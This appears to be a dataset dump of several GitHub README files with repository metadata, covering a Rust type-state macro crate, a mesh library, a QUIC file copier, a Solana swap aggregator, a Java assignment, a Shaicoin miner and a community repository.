    println!(""Skill slots: {}"", player.skill_slots);
}
```

<br>
<br>

---

<br>
<br>

> [!TIP]
> A simple Type-State `PlayerBuilder` example WITH state-shift:

```rust
use state_shift::{impl_state, type_state};

#[type_state(
    states = (Initial, RaceSet, LevelSet, SkillSlotsSet), // defines the available states
    slots = (Initial) // defines how many concurrent states will be there, and the initial values for these states
)]
struct PlayerBuilder {
    race: Option<Race>,
    level: Option<u8>,
    skill_slots: Option<u8>,
}

#[impl_state]
impl PlayerBuilder {
    #[require(Initial)] // require the default state for the constructor
    fn new() -> PlayerBuilder {
        PlayerBuilder {
            race: None,
            level: None,
            skill_slots: None,
        }
    }

    #[require(Initial)] // can be called only at `Initial` state.
    #[switch_to(RaceSet)] // Transitions to `RaceSet` state
    fn set_race(self, race: Race) -> PlayerBuilder {
        PlayerBuilder {
            race: Some(race),
            level: self.level,
            skill_slots: self.skill_slots,
        }
    }

    #[require(RaceSet)]
    #[switch_to(LevelSet)]
    fn set_level(self, level_modifier: u8) -> PlayerBuilder {
        let level = match self.race {
            Some(Race::Orc) => level_modifier + 2, // Orc's have +2 level advantage
            Some(Race::Human) => level_modifier,   // humans are weak
            None => unreachable!(""type safety ensures that `race` is initialized""),
        };

        PlayerBuilder {
            race: self.race,
            level: Some(level),
            skill_slots: self.skill_slots,
        }
    }

    #[require(LevelSet)]
    #[switch_to(SkillSlotsSet)]
    fn set_skill_slots(self, skill_slot_modifier: u8) -> PlayerBuilder {
        let skill_slots = match self.race {
            Some(Race::Orc) => skill_slot_modifier,
            Some(Race::Human) => skill_slot_modifier + 1, // Human's have +1 skill slot advantage
            None => unreachable!(""type safety ensures that `race` should be initialized""),
        };

        PlayerBuilder {
            race: self.race,
            level: self.level,
            skill_slots: Some(skill_slots),
        }
    }

    /// doesn't require any state, so this is available at any state
    #[require(A)]
    fn say_hi(self) -> Self {
        println!(""Hi!"");
        self
    }

    #[require(SkillSlotsSet)]
    fn build(self) -> Player {
        Player {
            race: self.race.expect(""type safety ensures this is set""),
            level: self.level.expect(""type safety ensures this is set""),
            skill_slots: self.skill_slots.expect(""type safety ensures this is set""),
        }
    }
}

#[derive(Debug)]
struct Player {
    race: Race,
    level: u8,
    skill_slots: u8,
}

#[derive(Debug, PartialEq)]
enum Race {
    #[allow(unused)]
    Orc,
    Human,
}

fn main() {
    let player = PlayerBuilder::new()
        .set_race(Race::Orc)
        .set_level(1)
        .set_skill_slots(1)
        .say_hi()
        .build();
    println!(""Race: {:?}"", player.race);
    println!(""Level: {}"", player.level);
    println!(""Skill slots: {}"", player.skill_slots);
}
```

## Let's break it down:

Consuming huge chunks of code may be overwhelming, so let's break it down.

> [!NOTE]
> Also, let's assume that you want to track multiple states simultaneously for your struct


### 1. Hiding the ugly and unreadable boilerplate code required for your structs:
<br/>

- without this library, you probably have to write something like this (BAD):
    ```rust
    struct PlayerBuilder<State1 = Initial, State2 = Initial, State3 = Initial>
    where
        State1: TypeStateProtector,
        State2: TypeStateProtector,
        State3: TypeStateProtector,
    {
        race: Option<Race>,
        level: Option<u8>,
        skill_slots: Option<u8>,
        spell_slots: Option<u8>,
        _state: (
            PhantomData<State1>,
            PhantomData<State2>,
            PhantomData<State3>,
        ),
    }
    ```

> [!CAUTION]
> The above code might suck the enjoyment out of writing Rust code.

<br/>
<br/>

- with this library, you can write this (GOOD):
    ```rust
    #[type_state(
        states = (Initial, RaceSet, LevelSet, SkillSlotsSet),
        slots = (Initial, Initial, Initial)
    )]
    struct PlayerBuilder {
        race: Option<Race>,
        level: Option<u8>,
        skill_slots: Option<u8>,
        spell_slots: Option<u8>,
    }
    ```

> [!TIP]
> Mmmhh! Much better, right?

<br/>

### 2. Hiding the  ugly and unreadable boilerplate code required for your impl blocks:

<br/>

- without this library, you probably have to write something like this (BAD):

    ```rust
    impl<B, C> PlayerBuilder<Initial, B, C>
    where
        B: TypeStateProtector,
        C: TypeStateProtector,
    {
        fn set_race(self, race: Race) -> PlayerBuilder<RaceSet, B, C> {
            {
                {
                    PlayerBuilder {
                        race: Some(race),
                        level: self.level,
                        skill_slots: self.skill_slots,
                        spell_slots: self.spell_slots,
                        _state: (PhantomData, PhantomData, PhantomData),
                    }
                }
            }
        }
    }
    ```

> [!CAUTION]
> It's not immediately obvious what's going on here, which state is required, to which state it's transitioning into, etc.

<br/>
<br/>

- with this library, you can write this (GOOD):
    ```rust
    #[require(Initial, B, C)]
    #[switch_to(RaceSet, B, C)]
    fn set_race(self, race: Race) -> PlayerBuilder {
        PlayerBuilder {
            race: Some(race),
            level: self.level,
            skill_slots: self.skill_slots,
            spell_slots: self.spell_slots,
        }
    }
    ```

> [!TIP]
> Immediately signals:
>
> - which state is required.
>
> - to which state it's transitioning into.
>
> No weird generics and intermediate unit structs that hurting your brain.

<br/>
<br/>

### 3. Hiding the ugly and unreadable boilerplate code required for intermediate traits and structs:

<br/>

- without this library, in order to ensure the type-safety, you have to write traits and unit structs (BAD):
    ```rust
    mod sealed {
        pub trait Sealed {}
    }

    pub trait TypeStateProtector: sealed::Sealed {}

    pub struct Initial;
    pub struct RaceSet;
    pub struct LevelSet;
    pub struct SkillSlotsSet;
    pub struct SpellSlotsSet;

    impl sealed::Sealed for Initial {}
    impl sealed::Sealed for RaceSet {}
    impl sealed::Sealed for LevelSet {}
    impl sealed::Sealed for SkillSlotsSet {}
    impl sealed::Sealed for SpellSlotsSet {}

    impl TypeStateProtector for Initial {}
    impl TypeStateProtector for RaceSet {}
    impl TypeStateProtector for LevelSet {}
    impl TypeStateProtector for SkillSlotsSet {}
    impl TypeStateProtector for SpellSlotsSet {}
    ```

> [!CAUTION]
> EWWWW

<br/>
<br/>


- with this library, you can write this (GOOD):
    ```rust
    #[type_state(states = (Initial, RaceSet, LevelSet, SkillSlotsSet), slots = (Initial, Initial, Initial))]
    struct PlayerBuilder {
        race: Option<Race>,
        level: Option<u8>,
        skill_slots: Option<u8>,
        spell_slots: Option<u8>,
    }
    ```

> [!TIP]
> The necessary states that we want to use, cannot be more clear!

<br/>

# Tell me more

I love type-state pattern's promises:

- compile time checks

- better/safer auto completion suggestions by your IDE

- no additional runtime costs

However, I agree that in order to utilize type-state pattern, the code has to become quite ugly. We are talking about less readable and maintainable code, just because of this.

Although I'm a fan, I agree usually it's not a good idea to use type-state pattern.

And THAT, my friends, bothered me...

So I wrote `state-shift`.

TL;DR -> it lets you convert your structs and methods into type-state version, without the ugly code. So, best of both worlds!

If you don't appreciate all the boilerplate code required by Type-State-Pattern that makes the DevX worse, but you still like the idea of type-safety provided by it, this library is for you. `state-shift` lets you write your code as if type-state-pattern was not there, yet grants you the benefits of type-safety.


# What the hell is even Type-State-Pattern?

Here is a great blog post that explains it, I heard that the author is a good person: https://cryptical.xyz/rust/type-state-pattern

TL;DR -> instead of relying on runtime checks, Type-State-Pattern uses type-safety to enforce specific methods are only callable at specific states at compile time.

For example, you cannot call `fight()` method on a `Player` struct when it is in `Dead` state. You normally accomplish this by introducing boolean flags and runtime checks. With Type-State-Pattern, you achieve this without any runtime checks, purely by the type-safety provided by Rust primitives.

This is good, due to:
- better DevX (users of the library won't be even able to call this invalid methods)
- less runtime bugs
- less runtime checks -> more performant code
- zero-cost abstractions for this type checks (no additional performance cost of doing this)

<br/>

## Why you should care about type-state?

### 1. State-Focused Methods

Let‚Äôs say you have a `Player` struct with methods like:

- `die()`
- `resurrect()`

As a reasonable person, you probably don‚Äôt want someone to call `die()` on a player who‚Äôs already `Dead`.

> [!TIP]
> People cannot die twice!

With this library, you can ensure that your methods respect the logical state transitions, preventing awkward situations like trying to `player.die().die()`;

This library lets you have above mentioned type-safe methods, *WITHOUT*:
- duplicating your structs (one for `Dead` state and one for `Alive` state)
- writing runtime checks
- hurting the performance of your code
- making your code horrible to look at due to infamous Type-State-Pattern

In short, the users of this library won't be able to call:

> [!CAUTION]
> ```rust
> let player = PlayerBuilder::new().die().die(); // ‚ùå Invalid!
> ```
> The good thing is, after calling the first `die()` method, the second `die()` **won't be even suggested** by your IDE via autocomplete.
>
> And even if you insist to type it anyway, it will be a compile-time error!


### 2. Field/Method Order & Dependencies

Imagine you have a `PlayerBuilder` struct designed to construct a `Player`. Some fields need to be set before others because of logical dependencies. For instance, the `race` field must be specified before the `level` field, as the race affects how we calculate the player's starting level.

> [!CAUTION]
>  So, we don't want the below code:
>```rust
>let player = PlayerBuilder::new().level(10) // ‚ùå Invalid!
>```

> [!TIP]
>  We want the below code:
>```rust
>let player = PlayerBuilder::new().race(Race::Human).level(10) // ‚úÖ
>```

The gist of it is, some fields of the `PlayerBuilder` are depending on other fields. So we want to force the users of this library to set these fields in order by making invalid orders completely unrepresentable at compile time. Even rust-analyzer won't suggest the invalid methods as auto-completion! How wonderful is that!

<br/>
<br/>

# Additional benefits of using this Library

### 1. You get type-safety for your methods, with concise and clear syntax.
The macros do all the heavy lifting for you. You just need to write your code as if type-state-pattern was not there, yet grants you the benefits of type-safety.

<br/>


### 2. Sealed-traits

this library also uses sealed-traits to ensure even more safety! And again, you don't need to worry about anything. Sealed-traits basically ensure that the user cannot implement these trait themselves. So, your structs are super-safe!

<br/>


### 3. Clear documentation

I tried to document nearly everything. If you are curios on what the macros do under the hood, even those macros are documented! Just check the inline documentation and I'm sure you will understand what's going on in a blink of an eye!

<br/>

### 4. Suggestions and contributions are welcome!

I'm a quite friendly guy. Don't hesitate to open an issue or a pull request if you have any suggestions or if you want to contribute! Just keep in mind that everyone contributing to here (including myself) are doing it voluntarily. So, always be respectful and appreciate other's time and effort.


<br/>
<br/>

# Advanced & Helpful Tips

Remember, this library is just hiding the ugly type-state-pattern boilerplate code under the hood. This means, your code still have to obey some rules.

Most of the issues arise from when we are returning the `Self` type. The compiler doesn't like the `Self` keyword in type-state-pattern, because we are actually not returning the `Self`, but a different type. For example, it could be that our method is accepting `Player<Alive>` but we are returning `Player<Dead>`.

And you know how Rust compiler is. It is very strict about types!


## Rules

### 1. If your method is switching states (most probably it does), avoid using `Self` in the return position of the method's signature:

> [!CAUTION]
>
> ```rust
> fn my_method(self) -> Self { // `-> Self` ‚ùå
>    // redacted body
> }

> [!TIP]
> ```rust
> fn my_method(self) -> PlayerBuilder { // `-> ConcreteName` ‚úÖ
>    // redacted body
> }


### 2. Similarly, also avoid using `Self` in the method's body:

> [!CAUTION]
>
> ```rust
> fn my_method(self) -> PlayerBuilder {
>
>    Self {  // `Self {}` ‚ùå
>       race: Race::human
>       level: self.level
>    }
> }

> [!TIP]
> ```rust
> fn my_method(self) -> PlayerBuilder {
>
>    PlayerBuilder {  // `PlayerBuilder {}` ‚úÖ
>       race: Race::human
>       level: self.level
>    }
> }

### 3. `self` is ok to use, but there is one exception:

> [!CAUTION]
>
> ```rust
> fn my_method(self) -> PlayerBuilder {
>
>    PlayerBuilder {
>       race: Race::human
>       ..self  // `..self` ‚ùå
>    }
> }

> [!NOTE]
> actually having `..self` is not supported by the Rust compiler in this context, YET.
>
> So hoping it will become stable in the future and we won't have to worry about it.

### 4. These macros appends a hidden `_state` field to your struct to make it compatible with type-state-pattern. If you want to opt-out of the macros for god knows why, keep in mind that you need to provide the hidden `_state` field for your methods.

> [!WARNING]
> ```rust
> impl PlayerBuilder {
>     fn my_weird_method(&self) -> Self {
>         Self {
>             race: Some(Race::Human),
>             level: self.level,
>             skill_slots: self.skill_slots,
>            _state: (::core::marker::PhantomData), // Don't forget this!
>         }
>     }
> }

> [!IMPORTANT]
> You only need to worry about `_state` field if you want to opt-out of the macros! So, keep using the macros, and keep yourself stress free ü•Ç


### 5. Don't use the same state names across different structs

> [!CAUTION]
>
> ```rust
> #[type_state(states = (Initial, RaceSet, LevelSet), slots = (Initial))]
> struct PlayerBuilder {
>     race: Option<Race>,
>     level: Option<u8>,
> }
>
> #[type_state(states = (Initial, RaceSet, LevelSet), slots = (Initial))]
> struct AnotherBuilder {
>     race: Option<Race>,
>     level: Option<u8>,
> }
> ```


> [!TIP]
>
> ```rust
> #[type_state(states = (Initial, RaceSet, LevelSet), slots = (Initial))]
> struct PlayerBuilder {
>     race: Option<Race>,
>     level: Option<u8>,
> }
>
> #[type_state(states = (OpInitial, OpRaceSet, OpLevelSet), slots = (OpInitial))]
> struct OpponentBuilder {
>     race: Option<Race>,
>     level: Option<u8>,
> }
> ```

It's up to you how to do the namings, but don't use the same state names across different structs.

`#[type_state]` macro generates marker structs for each state. If you use the same state names, the macro will try to generate multiple marker structs with the same name, causing compile-time errors.


## Tips

### 1. Tracking multiple states

This feature was both my favorite to implement and the most brain-melting (design-wise and implementation-wise).

**The problem:**

Imagine you have three fields for your struct: `a`, `b`, and `c`. You want `c` to be set only after both `a` and `b` are set. Not just one of them‚Äîboth.

How do you accomplish this with type-state-pattern? This is a problem because the default design pattern allows you to have a single state to track.

One workaround is to have multiple states for the combinations of `a` and `b`. For example, you can have the following states:
- `a_set_but_b_not_set`
- `b_set_but_a_not_set`
- `a_set_and_b_set`.

This is not a good solution due to 2 reasons:
- it is fucking ugly
- you need to duplicate your methods and give them different names, because you cannot have multiple methods with the same name. If this didn't make sense, take a look at the expanded codes, and you will see why we need to have the same method on different `impl` blocks. The compiler of course doesn't like that. The only workaround to have the same function body on different `impl` blocks, is to have different names for these methods. Same methods, but different names? No more explanation needed on why this is bad.

**The Solution:**

Multiple state slots. By allowing multiple state slots, you can track each state separately, and they won't override each other. You can see this in action in the `tests/complex_example.rs`. It showcases how this is done, and when can it be useful. Now, the macro for our struct should make more sense:

```rust
#[type_state(
    states = (Initial, RaceSet, LevelSet, SkillSlotsSet), // defines the available states
    slots = (Initial) // defines how many concurrent states will be there, and the initial values for these states
)]
struct PlayerBuilder {
    race: Option<Race>,
    level: Option<u8>,
    skill_slots: Option<u8>,
    spell_slots: Option<u8>,
}
```

### 2. How do I pass the player to a function (no method), does it require extra type annotations to specify the state?

Say you have this:

```rust
fn player_builder_logger(player_builder: PlayerBuilder) {
    println!(""PlayerBuilder's level: {:?}"", player_builder.level);
}
```

You can pass the `player_builder` without any type-annotation, but then it would expect the states to be equal to the default ones, in this case: `PlayerBuilder<Initial>`.

If you want to pass another state, I think you have to explicitly tell the code:
```rust
fn player_builder_logger(player_builder: PlayerBuilder<LevelSet>) {
    println!(""PlayerBuilder's level: {:?}"", player_builder.level);
}
```

Then you can call it like this:
```rust
fn main() {
        let player = PlayerBuilder::new().set_race(Race::Human).set_level(4);
        player_builder_logger(player);
}
```

### 3. Will the generics, lifetimes, and visibility of my methods and structs be preserved?
- yes
- yes
- yes
- yes
- yes

### 4. Can I use `async` or `const` methods?
- YES!

### 5. Can I use `Result<MyStruct>` or `Option<MyStruct>` or similar complex types in my methods?
- you can use them in the return type!
- you can use them in the body!
- basically, yes!

### 6. I don't see `require` and `switch_to` imported in the examples. What's up with that?

`require` and `switch_to` are consumed by the `impl_state` macro. I don't want to dive into technical details,
but basically `require` and `switch_to` need some extra info from the `impl` block, so `impl_state` macro handles all that
communication. If you are curious, check out the inline docs in `lib.rs`.

In short, you don't need to import `require` and `switch_to` in your code.

---

Happy coding!
",9,0,1,MIT,"generic.yml,typos.yml",25.0
ranjeethmahankali/alum,main,"# Alum: A Halfedge based Polygon Mesh Library

[![CI](https://github.com/ranjeethmahankali/alum/actions/workflows/ci.yml/badge.svg)](https://github.com/ranjeethmahankali/alum/actions/workflows/ci.yml)
[![Documentation](https://img.shields.io/badge/docs-latest-blue.svg)](https://docs.rs/alum/latest/alum/)
[![Crate](https://img.shields.io/crates/v/alum)](https://crates.io/crates/alum)
[![Examples with three_d](https://img.shields.io/badge/three__d-examples-purple)](https://github.com/ranjeethmahankali/alum/tree/main/examples)

![Standford Bunny](assets/bunny.png)

This library is inspired by
[OpenMesh](https://www.graphics.rwth-aachen.de/software/openmesh/), hence has an
API very similar to that of OpenMesh. I love using OpenMesh in C++, and wrote
this library because I couldn't find an equivalent in Rust. Huge thanks to
OpenMesh and it's maintainers for the inspiration!

For now, the features of this library exist to serve my other projects. It has
near parity with the `OpenMesh/Core` module, and new features will be added as
required by my other projects.

## Installation

This can be added to a Rust project as a dependency from
[crates.io](https://crates.io/crates/alum) with:

```sh
cargo add alum
```

Or by adding the following to your `Cargo.toml`:

```toml
[dependencies]
alum = ""0.5.2""
```

## Usage and Features

This library uses [`glam`](https://github.com/bitshifter/glam-rs) out of the box
for geometric types such as points, normals etc. These are enabled by the
`use_glam` feature and can be disabled if you don't want to use `glam`.

You can use this library with your own geometric types for points and normals
etc. by implementing an adaptor that tells this library how to work with your
geometric types. Read the [documentation](https://docs.rs/alum/latest/alum/) to
learn more about this. These
[examples](https://github.com/ranjeethmahankali/alum/tree/main/examples)
demonstrate writing custom adaptors and rendering and using various features of
this crate together with [`three_d`](https://github.com/asny/three-d)

This library also comes with a property system just like the one in `OpenMesh`,
with some small improvements and differences. The properties are always
synchronized with the mesh elements, through additions, deletions and garbage
collections which result in reordering of elements. Unlike properties in
`OpenMesh`, the properties here use interior mutability with `RefCell<T>` and
enforce runtime borrow checking rules. Read the
[documentation](https://docs.rs/alum/latest/alum/) to learn more.
",0,2,1,BSD-3-Clause,ci.yml,34.0
crazyscot/qcp,main,"[![Crates.io](https://img.shields.io/crates/v/qcp.svg)](https://crates.io/crates/qcp)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/crazyscot/qcp)
[![Build status](https://github.com/crazyscot/qcp/actions/workflows/ci.yml/badge.svg)](https://github.com/crazyscot/qcp/actions/workflows/ci.yml)
[![Documentation](https://docs.rs/qcp/badge.svg)](https://docs.rs/qcp/)
[![License](https://img.shields.io/badge/License-AGPL_v3-orange.svg)](LICENSE)

The QUIC Copier (`qcp`) is an experimental
high-performance remote file copy utility for long-distance internet connections.

## üìã Features

- üîß Drop-in replacement for `scp`
- üõ°Ô∏è Similar security to `scp`, using existing, well-known mechanisms
- üöÄ Better throughput on congested networks

#### Platform support status

- Well tested: Debian and Ubuntu on x86_64, using OpenSSH
- Tested: Ubuntu on WSL; aarch64 (Raspbian)
- Untested: OSX/BSD family
- Not currently supported: Windows

## üß∞ Getting Started

* You must have ssh access to the target machine.
* Install the `qcp` binary on both machines. It needs to be in your `PATH` on the remote machine.
* Run `qcp --help-buffers` and follow its instructions.

### Installing pre-built binaries

These can be found on the [latest release](https://github.com/crazyscot/qcp/releases/latest).

* Debian/Ubuntu packages are provided.
* For other Linux x86_64: Use x86_64-unknown-linux-musl.tar.gz
* For other Linux aarch64: Use aarch64-unknown-linux-musl.tar.gz

The binaries are statically linked. Linux builds should work on all recent distributions, as long as you have selected the correct CPU architecture.

### Installation from source

Prerequisite: You need to have `capnpc` installed. Your distribution likely packages this, or see https://capnproto.org/.

You can install the package from source using `cargo`:

```bash
cargo install --locked qcp
```

#### If you are new to Rust and don't have the tools installed

* Install the `rustup` tool via your package manager, or see [Rust installation](https://www.rust-lang.org/tools/install)
* `rustup toolchain install stable`
* Proceed as above

## ‚öôÔ∏è Usage

The basic syntax is the same as scp or rcp.

```
qcp [OPTIONS] <SOURCE> <DESTINATION>
```

The program has a comprehensive help message, accessed via `qcp -h` (brief) or `qcp --help` (long form).

For example:

```bash
$ qcp my-server:/tmp/testfile /tmp/
‚†Ç Transferring data                                                           2.1MB/s (last 1s)
testfile ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë 1s @ 6.71 MB/s [10.49 MB]
```

**The program uses the ssh binary on your system to connect to the target machine**.
ssh will check the remote host key and prompt you for a password or passphrase in the usual way.

#### Tuning

By default qcp is tuned for a 100Mbit connection, with 300ms round-trip time to the target server.

Various network tuning options are available.

For example, if you have 300Mbit/s (37.5MB/s) download and 100Mbit/s (12.5MB/s) upload, you might use these options:

```bash
qcp my-server:/tmp/testfile /tmp/ --rx 37M --tx 12M
```

Performance tuning can be a tricky subject. See the [performance] documentation.

## üìñ How qcp works

The brief version:

1. We ssh to the remote machine and run `qcp --server` there
1. Both sides generate a TLS key and exchange self-signed certs over the ssh pipe between them
1. We use those certs to set up a QUIC session between the two
1. We transfer files over QUIC

The [protocol] documentation contains more detail and a discussion of its security properties.

## ‚öñÔ∏è License

The initial release is made under the [GNU Affero General Public License](LICENSE).

## üßë‚Äçüè≠ Contributing

Feel free to report bugs via the [bug tracker].

I'd particularly welcome performance reports from BSD/OSX users as that's not a platform I use regularly.

While suggestions and feature requests are welcome, please be aware that I mostly work on this project in my own time.

## üí∏ Supporting the project

If you find this software useful and would like to say thank you, please consider [buying me a coffee] or [ko-fi]. [Github sponsorship] is also available.

If you're a business and need a formal invoice for your accountant, my freelancing company can issue the paperwork.
For this, and any other commercial enquiries (alternative licensing, support, etc) please get in touch, to `qcp@crazyscot.com`.

Please also consider supporting the galaxy of projects this work builds upon.
Most notably, [Quinn] is a pure-Rust implementation of the [QUIC] protocol, without which qcp simply wouldn't exist in its current form.

### üí° Roadmap

Some ideas for the future, in no particular order:

* A local config mechanism, so you don't have to type out the network parameters every time
* Support for copying multiple files (e.g. shell globs or `scp -r`)
* Windows native support, at least for client mode
* Firewall/NAT traversal
* Interactive file transfer (akin to `ftp`)
* Smart file copy using the `rsync` protocol or similar (send only the sections you need to)
* Graphical interface for ftp mode
* Review the protocol and perhaps pivot to using capnp RPC
* Bind a daemon to a fixed port, for better firewall/NAT traversal properties but at the cost of having to implement user authentication.
* _The same thing we do every night, Pinky. We try to take over the world!_

[bug tracker]: https://github.com/crazyscot/qcp/issues
[quic]: https://quicwg.github.io/
[Quinn]: https://opencollective.com/quinn-rs
[rfc9000]: https://www.rfc-editor.org/rfc/rfc9000.html
[buying me a coffee]: https://buymeacoffee.com/rossyounger
[ko-fi]: https://ko-fi.com/rossyounger
[protocol]: https://docs.rs/qcp/latest/qcp/protocol/index.html
[performance]: https://docs.rs/qcp/latest/qcp/doc/performance/index.html
[Github sponsorship]: https://github.com/sponsors/crazyscot?frequency=recurring&sponsor=crazyscot
",4,3,5,AGPL-3.0,"ci.yml,cleanup.yml,release.yml",9.0
blockworks-foundation/autobahn,main,"# Fill.city Autobahn

![logo](./brand/autobahn-logo-mark.svg)

Autobahn is the open source aggregator for swaps on Solana.
This public good protocol enables developers to contribute their own DEX adapters.
Take back control: access to orderflow from routers on Solana should not be centralized.

The graph search is optimized for reliability of trade execution.
Reliability is preferred over marginal price to improve user experience.
Full test coverage through daily verification of all routed pools ensures correctness.

A hosted version is available.
Reach out to partnerships@mango.markets to get an access token.
Self-hosting requires custom validator patches to enable low-latency account subscriptions.

## Using the router (as a client)

Basically it is the same API as Jupiter:
`https://autobahn.mngo.cloud/<TOKEN>/`

### quote (GET)

Supported parameters:
- inputMint
- outputMint
- amount
- slippageBps
- maxAccounts
- onlyDirectRoutes

### swap & swap-instructions (POST)

Supported parameters:

- userPublicKey
- wrapAndUnwrapSol
- autoCreateOutAta
- quoteResponse

## Running the router

See example configuration file [example-config.toml](bin/autobahn-router/example-config.toml) to create your own setup

Run like this:

```
RUST_LOG=info router my_config.toml
```

## Creating a new DEX Adapter

Adding new DEX adapter is welcome, you can do a pull-request, it will be appreciated !

See [CreatingAnAdapter.MD](CreatingAnAdapter.MD) file for details.

## Integration testing

It's possible to dump data from mainnet, and then use that in tests:
- To assert quoting is correct (same result as simulated swap)
- To check router path finding perfomance
 
See [Testing.MD](Testing.MD) file for details.

There's a script for daily smoke tests:

```
RPC_HTTP_URL=... ./scripts/smoke-test.sh
```

## Tokio-Console

Build router with feature `tokio-console` and `RUSTFLAGS=""--cfg tokio_unstable""` like this:

```RUSTFLAGS=""--cfg tokio_unstable"" cargo build --bin router --release --features tokio-console```

And use the `tokio-console` crate to display running tasks

## License

Autobahn is published under GNU Affero General Public License v3.0.
In case you are interested in an alternative license please reach out to partnerships@mango.markets
",3,2,19,AGPL-3.0,"build_test.yml,ci-verifiable-build.yml",44.0
drjeffgeoff/javaprojects,main,"Module 9: Collections Framework and Generics in Java
Assignments:

1. Demonstrates how to create, add, remove, and access elements in an ArrayList (5 Marks)
2. Write code for Using ArrayList to Store and Display Elements (5 Marks)
An ArrayList is a resizable array, part of the List interface in the Java Collections Framework. (5 Marks)
3. Show how to use a HashSet to store unique elements and how to handle duplicates. (5 Marks)
4. Show how to use a HashMap to store key-value pairs and access them. (5 Marks)
5. Create a Generic Method. A generic method allows us to create a method that can work with any data type. (5 Marks)

Note: Upload your code to the GitHub.Follow me to see ur code. Best Regards.
Here is the skills.
ArrayList: Dynamic arrays for storing elements.
HashSet: Unique, unordered collection.
HashMap: Key-value pairs for mapping data.
Generic Class: Flexible class that can handle any type safely.
Generic Method: Reusable methods that work with different types without typecasting.

These MCQs cover the core topics from the Basics of Java, environment setup, writing first programs,Syntax, data types, and input/output operations,Conditional and looping statements.
, Methods, functions, and recursion of your Java course, helping students review key concepts.
////////////////////////////////
Steps for Pulling the source code

1. git clone https://github.com/drjeffgeoff/javaprojects.git
",0,1,1,,,1.0
shaicoin/shaipot,master,"
# Shaipot - Shaicoin Miner

Welcome to **Shaipot**, a Shaicoin miner written in Rust. Shaipot is designed for efficiency and speed, supporting multi-threaded mining with minimal setup.

## Getting Started

To start mining with **Shaipot**, you need to provide the necessary arguments to connect to a mining pool and specify your Shaicoin address. Let's walk through how to set up and start mining.

### Required Arguments

- `--address <shaicoin_address>`  
  Your **Shaicoin address** where you want your mining rewards to be sent.
  
- `--pool <POOL_URL>`  
  The **pool URL** to which your miner will connect for jobs. This should be a valid WebSocket URL for the pool.

### Optional Arguments

- `--threads <AMT>`  
  Specifies the number of threads to use for mining. By default, the miner will automatically detect the optimal number of threads based on your system's available cores, but you can override this by specifying a value manually.

- `--vdftime <SECONDS>`  
  Specifies the number of seconds to wait before bailing out of the Hamiltonian graph search for mining. By default, the miner will automatically use 1 second. However, for slower CPUs this might need to be adjusted. 

## Compilation

To ensure **Shaipot** is compiled with the highest optimization for your CPU, use the following command:

```bash
cargo rustc --release -- -C opt-level=3 -C target-cpu=native -C codegen-units=1 -C debuginfo=0
```

This will optimize the build for your specific system, ensuring maximum performance during mining.

After compilation, the resulting executable will be located in the `target/release` directory. You can run it from there using the following command:

```bash
./target/release/shaipot --address <shaicoin_address> --pool <POOL_URL> [--threads <AMT>] [--vdftime <SECONDS>]
```

Make sure to replace `<shaicoin_address>` and `<POOL_URL>` with your actual Shaicoin address and the pool URL you're using.

## Running the Program

Once compiled, **Shaipot** is ready to run! Simply use the command provided above, specifying your Shaicoin address, the pool URL, and (optionally) the number of threads. Here's an example:

```bash
./target/release/shaipot --address sh1qeexkz69dz6j4q0zt0pkn36650yevwc8eksqeuu --pool wss://pool.shaicoin.org --threads 4
```

Example usage of vdftime looks like the following
```bash
--vdftime 1.5
```

This will start the mining process, and you'll see output as **Shaipot** connects to the pool and begins mining.

```plaintext
                          __
                         // \
                         \\_/ // 
    brrr''-.._.-''-.._.. -(||)(')
                         '''  
        _
     __( )_
    (      (o____
     |          |
     |      (__/
       \     /   ___
       /     \  \___/
     /    ^    /     \
    |   |  |__|_ SHA  |
    |    \______)____/
     \         /
       \     /_
        |  ( __)
        (____)
```

Happy Mining!
",0,1,1,,,5.0
indrakishore/Developers-Community,main,"# Developers-Community

__These implementations are for learning purpose. The solution would be provided in any programming language.__

You are welcomed to contribute in the repository. For contributions in the repository, Do read Contribution Guidelines.

## Table of contents

-  We are committed to fostering an open and welcoming environment. Please read our Contribution GuideLines[Contribution Guidelines](https://github.com/indrakishore/Developers-Community/blob/main/contributing.md) before participation in our community.

## Features ‚ú® 

### Project Structure<p></p>
 
### How to Contribute<p></p>

### Featured Projects<p></p>

### Project Goals<p></p>


### Installation üì•

To get started with the Developers-Community, follow these steps:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/indrakishore/Developers-Community
   ``` 
2. **Open the DSA,BACKENED,FRONTENED file:**:

    Simply open the **ANY OF THEM** file in your browser .
    Start Contribute yourself.

## Contact Me üìß

Feel free to reach out if you have any questions or suggestions. **I'd Love to hear** ‚ù§Ô∏è:

- **My GitHub**: [https://indrakishore.github.io](https://indrakishore.github.io)



## üåü Star the Project

If you like this project, please give it a star on GitHub! ‚≠ê

[GitHub stars](https://github.com/indrakishore/Developers-Community)
<br>

### Thankyou For the Visit! ‚ù§Ô∏èüìà
 

### Moderator

* **Indra Kishore Kumar** - Software Developer.   [Know More!](https://indrakishore.github.io)


",0,36,2,MIT,,99.0
BountySecurity/GBountyProfilesDesigner,master,"# ![GBounty Profiles Designer Logo](/static/logo.png)

# GBounty Profiles Designer

[![GitHub release](https://img.shields.io/github/release/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/releases)
[![GitHub last commit](https://img.shields.io/github/last-commit/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/commits/main)
[![GitHub issues](https://img.shields.io/github/issues/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/issues)
[![GitHub forks](https://img.shields.io/github/forks/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/network)
[![GitHub stars](https://img.shields.io/github/stars/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/stargazers)
